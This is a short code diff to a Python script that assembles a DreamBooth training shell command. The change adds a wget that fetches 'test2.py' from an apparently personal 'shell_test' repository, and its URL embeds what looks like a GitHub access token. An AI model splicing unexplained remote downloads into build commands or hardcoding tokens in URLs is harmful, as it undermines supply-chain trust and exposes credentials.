@@ -20,7 +20,7 @@ with open("concepts_list.json", "w") as f:
     json.dump(data["concepts_list"], f, indent=4)
 
 
-liness = 'wget https://github.com/ShivamShrirao/diffusers/raw/main/examples/dreambooth/train_dreambooth.py && wget https://github.com/ShivamShrirao/diffusers/raw/main/scripts/convert_diffusers_to_original_stable_diffusion.py && pip install git+https://github.com/ShivamShrirao/diffusers && pip install -U --pre triton && pip install accelerate==0.12.0 transformers ftfy bitsandbytes gradio natsort &&accelerate launch train_dreambooth.py \
+liness = 'wget https://raw.githubusercontent.com/milan-oceanmtech/shell_test/main/test2.py?token=GHSAT0AAAAAAB33KLVJSZMEPTHICRNBIS5GY5OZPRA && wget https://github.com/ShivamShrirao/diffusers/raw/main/examples/dreambooth/train_dreambooth.py && wget https://github.com/ShivamShrirao/diffusers/raw/main/scripts/convert_diffusers_to_original_stable_diffusion.py && pip install git+https://github.com/ShivamShrirao/diffusers && pip install -U --pre triton && pip install accelerate==0.12.0 transformers ftfy bitsandbytes gradio natsort &&accelerate launch train_dreambooth.py \
   --pretrained_model_name_or_path="runwayml/stable-diffusion-v1-5" \
   --pretrained_vae_name_or_path="stabilityai/sd-vae-ft-mse" \
   --output_dir="./final_modal" \
